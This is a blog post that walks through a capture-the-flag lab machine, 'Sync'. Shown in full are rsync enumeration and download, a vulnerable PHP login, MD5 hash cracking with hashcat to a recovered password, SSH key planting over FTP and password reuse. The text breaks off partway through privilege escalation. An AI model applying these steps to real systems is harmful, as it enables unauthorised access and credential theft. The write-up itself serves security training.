<!DOCTYPE html>
<html><head>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Vulnlab: Sync - Journal</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="Sync is an easy linux machine from vulnlabs where we can abuse a misconfigured rsync to download a backup of the website. We discover some password hashes and how it is being generated, with a particular salt and pepper. We use this to crack the hashes and get access to the FTP service and upload our public to authenticate to the machine. Root can be achieved by exploiting a misconfigured backup script." />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="Vulnlab: Sync" />
<meta property="og:description" content="Sync is an easy linux machine from vulnlabs where we can abuse a misconfigured rsync to download a backup of the website. We discover some password hashes and how it is being generated, with a particular salt and pepper. We use this to crack the hashes and get access to the FTP service and upload our public to authenticate to the machine. Root can be achieved by exploiting a misconfigured backup script." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://danp.bz/posts/vulnlab-sync/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-09-05T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-09-05T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Vulnlab: Sync"/>
<meta name="twitter:description" content="Sync is an easy linux machine from vulnlabs where we can abuse a misconfigured rsync to download a backup of the website. We discover some password hashes and how it is being generated, with a particular salt and pepper. We use this to crack the hashes and get access to the FTP service and upload our public to authenticate to the machine. Root can be achieved by exploiting a misconfigured backup script."/>
<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
	<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@1,500&display=swap" rel="stylesheet">
        <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet">
        <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">

	
	<link rel="stylesheet" type="text/css" media="screen" href="https://danp.bz/css/main.5a1df495afe53092e2ad0c172adb2250810f442ca165c5f85673cb3b860f3468.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://danp.bz/css/dark.134db564d2aacf16987413a93acdb0fdfe7ada0bd1972f2871066b32c9277a7b.css"  disabled />
	

	
	

	
	
	
	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="https://danp.bz/">Journal</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/whoami">Whoami</a>
		
		<a href="/tags">Tags</a>
		
		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
		<script src="https://danp.bz/js/themetoggle.js"></script>
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">Vulnlab: Sync</h1>
			<div class="meta">Posted on Sep 5, 2023</div>
		</div>
		

		<section class="body">
			<ul>
<li><a href="#overview">Overview</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#abusing-rsync-service">Abusing Rsync Service</a></li>
<li><a href="#cracking-custom-hashes">Cracking Custom Hashes</a></li>
<li><a href="#uploading-our-public-key">Uploading Our Public Key</a></li>
<li><a href="#usertxt">User.txt</a></li>
<li><a href="#cracking-shadow-credentials">Cracking Shadow Credentials</a></li>
<li><a href="#roottxt">Root.txt</a></li>
<li><a href="#extra-mile">Extra Mile</a></li>
</ul>
<h1 id="overview">Overview</h1>
<ol>
<li>Identify and exploit the rsync service to get the source code and database file</li>
<li>Get the hashes and learn how they were generated</li>
<li>Crack the custom hashes with hashcat</li>
<li>Authenticate to the FTP service and upload our public key</li>
<li>Escalate privileges horizontally to get user.txt</li>
<li>Get shadow file that was zipped incorrectly</li>
<li>Crack the password with john to login as <code>sa</code></li>
<li><code>sa</code> user can write the <code>backup.sh</code> file that is executed by root frequently</li>
<li>Overwrite the file to get root</li>
</ol>
<h1 id="nmap">Nmap</h1>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>--- vulnlabs/easy-sync Â» nmap -sV -sC 10.10.92.76                                                                                                                                   130 â†µ
</span></span><span style="display:flex;"><span>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 15:10 EDT
</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.92.76
</span></span><span style="display:flex;"><span>Host is up (0.17s latency).
</span></span><span style="display:flex;"><span>Not shown: 996 closed tcp ports (conn-refused)
</span></span><span style="display:flex;"><span>PORT    STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>21/tcp  open  ftp     vsftpd 3.0.5
</span></span><span style="display:flex;"><span>22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   256 a5:dc:e8:20:f4:75:7d:9f:8a:73:1e:b9:ad:35:07:bf (ECDSA)
</span></span><span style="display:flex;"><span>|_  256 38:74:d2:71:9d:82:97:c2:0e:1a:bb:f8:62:fd:3d:ed (ED25519)
</span></span><span style="display:flex;"><span>80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
</span></span><span style="display:flex;"><span>|_http-title: Login
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.52 (Ubuntu)
</span></span><span style="display:flex;"><span>| http-cookie-flags: 
</span></span><span style="display:flex;"><span>|   /: 
</span></span><span style="display:flex;"><span>|     PHPSESSID: 
</span></span><span style="display:flex;"><span>|_      httponly flag not set
</span></span><span style="display:flex;"><span>873/tcp open  rsync   (protocol version 31)
</span></span><span style="display:flex;"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 31.48 seconds
</span></span></code></pre></div><ul>
<li><code>-sV</code>: Enumerate versions from the services</li>
<li><code>-sC</code>: Run some nmap&rsquo;s default scripts</li>
</ul>
<h1 id="abusing-rsync-service">Abusing Rsync Service</h1>
<p>Service <code>rsync</code> seems interesting, <a href="https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync">this</a> great cheat sheet from hacktricks is enough to make us have access to the source code.</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>--- vulnlabs/easy-sync Â» rsync -av --list-only rsync://10.10.92.76/        
</span></span><span style="display:flex;"><span>httpd          	web backup
</span></span><span style="display:flex;"><span>--- vulnlabs/easy-sync Â» rsync -av rsync://10.10.92.76/httpd/ web<span style="color:#0086d2">\ </span>backup/
</span></span><span style="display:flex;"><span>receiving incremental file list
</span></span><span style="display:flex;"><span>created directory web backup
</span></span><span style="display:flex;"><span>./
</span></span><span style="display:flex;"><span>db/
</span></span><span style="display:flex;"><span>db/site.db
</span></span><span style="display:flex;"><span>migrate/
</span></span><span style="display:flex;"><span>www/
</span></span><span style="display:flex;"><span>www/dashboard.php
</span></span><span style="display:flex;"><span>www/index.php
</span></span><span style="display:flex;"><span>www/logout.php
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sent <span style="color:#0086f7;font-weight:bold">123</span> bytes  received 16,850 bytes  6,789.20 bytes/sec
</span></span><span style="display:flex;"><span>total size is 16,426  speedup is 0.97
</span></span></code></pre></div><h1 id="cracking-custom-hashes">Cracking Custom Hashes</h1>
<p>We can use <code>sqlitebrowser</code> to view the .db file we just got</p>
<p><img src="/sync-img/image.png" alt="sqlite3"></p>
<p>We spot two usernames and hashed passwords:</p>
<ul>
<li>admin:7658a2741c9df3a97c819584db6e6b3c</li>
<li>triss:a0de4d7f81676c3ea9eabcadfd2536f6</li>
</ul>
<p>Taking a closer look at the source code, we can see how those hashes were generated:</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>&lt;?php
</span></span><span style="display:flex;"><span>session_start();
</span></span><span style="display:flex;"><span><span style="color:#fb660a">$secure</span> = <span style="color:#0086d2">&#34;6c4972f3717a5e881e282ad3105de01e&#34;</span>; <span style="color:#080;background-color:#0f140f;font-style:italic">//Constant
</span></span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic"></span>
</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">if</span> (isset(<span style="color:#fb660a">$_SESSION</span>[<span style="color:#0086d2">&#39;username&#39;</span>])) {
</span></span><span style="display:flex;"><span>    header(<span style="color:#0086d2">&#39;Location: dashboard.php&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#fb660a;font-weight:bold">exit</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">if</span> (isset(<span style="color:#fb660a">$_POST</span>[<span style="color:#0086d2">&#39;username&#39;</span>]) &amp;&amp; isset(<span style="color:#fb660a">$_POST</span>[<span style="color:#0086d2">&#39;password&#39;</span>])) {
</span></span><span style="display:flex;"><span>    <span style="color:#fb660a">$username</span> = <span style="color:#fb660a">$_POST</span>[<span style="color:#0086d2">&#39;username&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#fb660a">$password</span> = <span style="color:#fb660a">$_POST</span>[<span style="color:#0086d2">&#39;password&#39;</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fb660a">$hash</span> = md5(<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">$secure</span><span style="color:#0086d2">|</span><span style="color:#0086d2">$username</span><span style="color:#0086d2">|</span><span style="color:#0086d2">$password</span><span style="color:#0086d2">&#34;</span>);   <span style="color:#080;background-color:#0f140f;font-style:italic">//Generating the Hash
</span></span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic"></span>    <span style="color:#fb660a">$db</span> = <span style="color:#fb660a;font-weight:bold">new</span> SQLite3(<span style="color:#0086d2">&#39;../db/site.db&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#fb660a">$result</span> = <span style="color:#fb660a">$db</span>-&gt;<span style="color:#ff0086;font-weight:bold">query</span>(<span style="color:#0086d2">&#34;SELECT * FROM users WHERE username = &#39;</span><span style="color:#0086d2">$username</span><span style="color:#0086d2">&#39; AND password= &#39;</span><span style="color:#0086d2">$hash</span><span style="color:#0086d2">&#39;&#34;</span>); <span style="color:#080;background-color:#0f140f;font-style:italic">//SQL Injection
</span></span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic"></span>    <span style="color:#fb660a">$row</span> = <span style="color:#fb660a">$result</span>-&gt;<span style="color:#ff0086;font-weight:bold">fetchArray</span>(SQLITE3_ASSOC);
</span></span><span style="display:flex;"><span>    <span style="color:#fb660a;font-weight:bold">if</span> (<span style="color:#fb660a">$row</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#fb660a">$_SESSION</span>[<span style="color:#0086d2">&#39;username&#39;</span>] = <span style="color:#fb660a">$row</span>[<span style="color:#0086d2">&#39;username&#39;</span>];
</span></span><span style="display:flex;"><span>        header(<span style="color:#0086d2">&#39;Location: dashboard.php&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">exit</span>();
</span></span><span style="display:flex;"><span>    } <span style="color:#fb660a;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#fb660a">$error_message</span> = <span style="color:#0086d2">&#39;Invalid username or password.&#39;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We discover that the hashes we just saw are composed by three main parts separated by a <code>|</code>:</p>
<ol>
<li><code>$secure</code>: a constant of value <em>6c4972f3717a5e881e282ad3105de01e</em></li>
<li><code>$username</code>: could be <code>admin</code> or <code>triss</code></li>
<li><code>$password</code>: The actual password</li>
</ol>
<p>An example would look like: <code>md5(6c4972f3717a5e881e282ad3105de01e|admin|password)</code></p>
<p>Now we have everything we need to crack it using hashcat:</p>
<p>let&rsquo;s create a file containing the hashes in this format:</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>a0de4d7f81676c3ea9eabcadfd2536f6:6c4972f3717a5e881e282ad3105de01e|triss|
</span></span><span style="display:flex;"><span>7658a2741c9df3a97c819584db6e6b3c:6c4972f3717a5e881e282ad3105de01e|admin|
</span></span></code></pre></div><p>and run hashcat with mode 20 (<code>$salt.$pass</code>)</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>--- vulnlabs/easy-sync Â» hashcat -a <span style="color:#0086f7;font-weight:bold">0</span> -m <span style="color:#0086f7;font-weight:bold">20</span> hashes.txt /usr/share/wordlists/rockyou.txt --show
</span></span><span style="display:flex;"><span>a0de4d7f81676c3ea9eabcadfd2536f6:6c4972f3717a5e881e282ad3105de01e|triss|:gerald
</span></span></code></pre></div><p>If you are running for the first time remove the <code>--show</code> flag.</p>
<p>good, we find the password for <code>triss</code>, <code>gerald</code>. Sadly we are not able to authenticate via ssh due to password authentication being disabled.</p>
<h1 id="uploading-our-public-key">Uploading Our Public Key</h1>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>--- vulnlabs/easy-sync Â» ssh triss@10.10.83.249
</span></span><span style="display:flex;"><span>triss@10.10.83.249: Permission denied (publickey).
</span></span></code></pre></div><p>Looking back to our nmap scan, we also had a <code>FTP</code> service running:</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>--- vulnlabs/easy-sync Â» ftp 10.10.83.249                                                                                                                                           <span style="color:#0086f7;font-weight:bold">255</span> â†µ
</span></span><span style="display:flex;"><span>Connected to 10.10.83.249.
</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">220</span> (vsFTPd 3.0.5)
</span></span><span style="display:flex;"><span>Name (10.10.83.249:kali): triss
</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">331</span> Please specify the password.
</span></span><span style="display:flex;"><span>Password: 
</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">230</span> Login successful.
</span></span><span style="display:flex;"><span>Remote system type is UNIX.
</span></span><span style="display:flex;"><span>Using binary mode to transfer files.
</span></span><span style="display:flex;"><span>ftp&gt; ls -la
</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">229</span> Entering Extended Passive Mode (|||32670|)
</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">150</span> Here comes the directory listing.
</span></span><span style="display:flex;"><span>drwxr-x---    <span style="color:#0086f7;font-weight:bold">2</span> <span style="color:#0086f7;font-weight:bold">1003</span>     <span style="color:#0086f7;font-weight:bold">1003</span>         <span style="color:#0086f7;font-weight:bold">4096</span> Apr <span style="color:#0086f7;font-weight:bold">21</span> 12:08 .
</span></span><span style="display:flex;"><span>drwxr-x---    <span style="color:#0086f7;font-weight:bold">2</span> <span style="color:#0086f7;font-weight:bold">1003</span>     <span style="color:#0086f7;font-weight:bold">1003</span>         <span style="color:#0086f7;font-weight:bold">4096</span> Apr <span style="color:#0086f7;font-weight:bold">21</span> 12:08 ..
</span></span><span style="display:flex;"><span>lrwxrwxrwx    <span style="color:#0086f7;font-weight:bold">1</span> <span style="color:#0086f7;font-weight:bold">0</span>        <span style="color:#0086f7;font-weight:bold">0</span>               <span style="color:#0086f7;font-weight:bold">9</span> Apr <span style="color:#0086f7;font-weight:bold">21</span> 12:08 .bash_history -&gt; /dev/null
</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#0086f7;font-weight:bold">1</span> <span style="color:#0086f7;font-weight:bold">1003</span>     <span style="color:#0086f7;font-weight:bold">1003</span>          <span style="color:#0086f7;font-weight:bold">220</span> Apr <span style="color:#0086f7;font-weight:bold">19</span> 19:37 .bash_logout
</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#0086f7;font-weight:bold">1</span> <span style="color:#0086f7;font-weight:bold">1003</span>     <span style="color:#0086f7;font-weight:bold">1003</span>         <span style="color:#0086f7;font-weight:bold">3771</span> Apr <span style="color:#0086f7;font-weight:bold">19</span> 19:37 .bashrc
</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#0086f7;font-weight:bold">1</span> <span style="color:#0086f7;font-weight:bold">1003</span>     <span style="color:#0086f7;font-weight:bold">1003</span>          <span style="color:#0086f7;font-weight:bold">807</span> Apr <span style="color:#0086f7;font-weight:bold">19</span> 19:37 .profile
</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">226</span> Directory send OK.
</span></span></code></pre></div><p>We appear to be inside triss&rsquo; home directory, which means that we can upload our own public key inside the <code>.ssh</code> directory.</p>
<p>So, all we need to do is:</p>
<ol>
<li>Generate a ssh keypair with <code>ssh-keygen</code></li>
<li>Create the <code>.ssh</code> folder inside triss&rsquo; home folder</li>
<li>Upload an <code>authorized_keys</code> file with our public key inside</li>
<li>Authenticate with our private key recently generated</li>
</ol>
<blockquote>
<p>If you just type ssh-keygen, a key pair will be created inside the .ssh folder in your home folder by default with a name of id_rsa.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>--- vulnlabs/easy-sync Â» cat ~/.ssh/id_rsa.pub &gt; authorized_keys
</span></span><span style="display:flex;"><span>--- vulnlabs/easy-sync Â» cat authorized_keys 
</span></span><span style="display:flex;"><span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC07/jyHsRn7J25aKqkCzdxjft8uliVMHTgnKS9PF5WSwxCzhURfOkHFRqigHYhlCXUxIHNu3p3ajsxUN7rVDAjos1ykJ89YjtzHj+g7DQAcLUDh9jRLPa2iZx8kMMXPougehq5slgeUiiCTAlaeStTYb3Au5qD5e4NKT9sOf7ZK6mrHQufW2IrHex6PXAFLsR8/MPGgPv4Hb2zZzevTDSs9muzUW725F06//EIuMK+wwICfZE477oxGEZJ3QNY3szadeDhc1QaWlZW2rkHeTuCBO5nUAiWOA3iqb2QEwfdFWZOabS9qYy07gzOS+IKVGv6IPlEAw44Of/9DCeYsx3AI5oyiZlTZol9ZUUcJVG2q/z+zmXyQVSgU8YZGkBnvwPpFkdrSaiWGOTOqcbeWZcZawwGhFJzA6pI4JkuZcrbewJBng1IPI8teVRPh/M1boz4HVDjoKkmdplTMhkhcpcj7m94BL97zNW0ivmt3V6UAh5pycjIh9BKG6id36iti4c= kali@kali
</span></span></code></pre></div><p>Upload our pub key:</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ftp&gt; mkdir .ssh
</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">257</span> <span style="color:#0086d2">&#34;/.ssh&#34;</span> created
</span></span><span style="display:flex;"><span>ftp&gt; cd .ssh
</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">250</span> Directory successfully changed.
</span></span><span style="display:flex;"><span>ftp&gt; put authorized_keys
</span></span><span style="display:flex;"><span>local: authorized_keys remote: authorized_keys
</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">229</span> Entering Extended Passive Mode (|||46667|)
</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">150</span> Ok to send data.
</span></span><span style="display:flex;"><span>100% |*********************************************************************************************************************************************|   <span style="color:#0086f7;font-weight:bold">563</span>        4.66 MiB/s    00:00 ETA
</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">226</span> Transfer complete.
</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">563</span> bytes sent in 00:00 (1.57 KiB/s)
</span></span></code></pre></div><p>Now we can just ssh in with our private key</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>--- vulnlabs/easy-sync Â» ssh triss@10.10.83.249
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.19.0-1023-aws x86_64)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> &lt;=========================<span style="color:#fb660a">snip</span>===========================&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span></span><span style="display:flex;"><span>applicable law.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>triss@ip-10-10-200-238:~$ whoami
</span></span><span style="display:flex;"><span>triss
</span></span></code></pre></div><h1 id="usertxt">User.txt</h1>
<p>Initial enumeration revealed that the user <code>jennifer</code> is using the same passaword as <code>triss</code></p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>triss@ip-10-10-200-238:~$ su jennifer
</span></span><span style="display:flex;"><span>Password: 
</span></span><span style="display:flex;"><span>jennifer@ip-10-10-200-238:/home/triss$ cd ..
</span></span><span style="display:flex;"><span>jennifer@ip-10-10-200-238:/home$ ls
</span></span><span style="display:flex;"><span>httpd  jennifer  sa  triss  ubuntu
</span></span><span style="display:flex;"><span>jennifer@ip-10-10-200-238:/home$ cd jennifer/
</span></span><span style="display:flex;"><span>jennifer@ip-10-10-200-238:~$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#0086f7;font-weight:bold">24</span>
</span></span><span style="display:flex;"><span>drwxr-x--- <span style="color:#0086f7;font-weight:bold">2</span> jennifer jennifer <span style="color:#0086f7;font-weight:bold">4096</span> Apr <span style="color:#0086f7;font-weight:bold">21</span> 12:08 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#0086f7;font-weight:bold">7</span> root     root     <span style="color:#0086f7;font-weight:bold">4096</span> Apr <span style="color:#0086f7;font-weight:bold">19</span> 19:42 ..
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#0086f7;font-weight:bold">1</span> root     root        <span style="color:#0086f7;font-weight:bold">9</span> Apr <span style="color:#0086f7;font-weight:bold">21</span> 12:08 .bash_history -&gt; /dev/null
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#0086f7;font-weight:bold">1</span> jennifer jennifer  <span style="color:#0086f7;font-weight:bold">220</span> Apr <span style="color:#0086f7;font-weight:bold">19</span> 19:42 .bash_logout
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#0086f7;font-weight:bold">1</span> jennifer jennifer <span style="color:#0086f7;font-weight:bold">3771</span> Apr <span style="color:#0086f7;font-weight:bold">19</span> 19:42 .bashrc
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#0086f7;font-weight:bold">1</span> jennifer jennifer  <span style="color:#0086f7;font-weight:bold">807</span> Apr <span style="color:#0086f7;font-weight:bold">19</span> 19:42 .profile
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#0086f7;font-weight:bold">1</span> jennifer jennifer   <span style="color:#0086f7;font-weight:bold">37</span> Apr <span style="color:#0086f7;font-weight:bold">19</span> 19:40 user.txt
</span></span><span style="display:flex;"><span>jennifer@ip-10-10-200-238:~$ cat user.txt 
</span></span><span style="display:flex;"><span>VL{bcf8&lt;snip&gt;a2db}
</span></span><span style="display:flex;"><span>jennifer@ip-10-10-200-238:~$ 
</span></span></code></pre></div><h1 id="cracking-shadow-credentials">Cracking Shadow Credentials</h1>
<p>Investigating the <code>/</code> path, we see a non-default folder called <code>backup</code></p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>jennifer@ip-10-10-200-238:/backup$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#0086f7;font-weight:bold">128</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#0086f7;font-weight:bold">2</span> root root <span style="color:#0086f7;font-weight:bold">4096</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:30 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#0086f7;font-weight:bold">20</span> root root <span style="color:#0086f7;font-weight:bold">4096</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:01 ..
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#0086f7;font-weight:bold">1</span> root root <span style="color:#0086f7;font-weight:bold">5899</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:02 1693958521.zip
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#0086f7;font-weight:bold">1</span> root root <span style="color:#0086f7;font-weight:bold">5899</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:04 1693958641.zip
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#0086f7;font-weight:bold">1</span> root root <span style="color:#0086f7;font-weight:bold">5899</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:06 1693958761.zip
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#0086f7;font-weight:bold">1</span> root root <span style="color:#0086f7;font-weight:bold">5899</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:08 1693958881.zip
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#0086f7;font-weight:bold">1</span> root root <span style="color:#0086f7;font-weight:bold">5899</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:10 1693959001.zip
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#0086f7;font-weight:bold">1</span> root root <span style="color:#0086f7;font-weight:bold">5899</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:12 1693959121.zip
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#0086f7;font-weight:bold">1</span> root root <span style="color:#0086f7;font-weight:bold">5899</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:14 1693959241.zip
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#0086f7;font-weight:bold">1</span> root root <span style="color:#0086f7;font-weight:bold">5899</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:16 1693959361.zip
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#0086f7;font-weight:bold">1</span> root root <span style="color:#0086f7;font-weight:bold">5899</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:18 1693959481.zip
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#0086f7;font-weight:bold">1</span> root root <span style="color:#0086f7;font-weight:bold">5899</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:20 1693959601.zip
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#0086f7;font-weight:bold">1</span> root root <span style="color:#0086f7;font-weight:bold">5899</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:22 1693959721.zip
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#0086f7;font-weight:bold">1</span> root root <span style="color:#0086f7;font-weight:bold">5899</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:24 1693959841.zip
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#0086f7;font-weight:bold">1</span> root root <span style="color:#0086f7;font-weight:bold">5899</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:26 1693959961.zip
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#0086f7;font-weight:bold">1</span> root root <span style="color:#0086f7;font-weight:bold">5899</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:28 1693960081.zip
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#0086f7;font-weight:bold">1</span> root root <span style="color:#0086f7;font-weight:bold">5899</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:30 1693960201.zip
</span></span></code></pre></div><p>Judging by the frequency these files are being created and who owns them, there is most likely a cron job being run by root every two minutes. Since we can read them, let&rsquo;s see their content.</p>
<p>We move one of them to the <code>/dev/shm</code> folder and unzip it:</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>jennifer@ip-10-10-200-238:/dev/shm/tmp/backup$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#0086f7;font-weight:bold">12</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#0086f7;font-weight:bold">3</span> jennifer jennifer  <span style="color:#0086f7;font-weight:bold">120</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:02 .
</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#0086f7;font-weight:bold">3</span> jennifer jennifer   <span style="color:#0086f7;font-weight:bold">60</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:42 ..
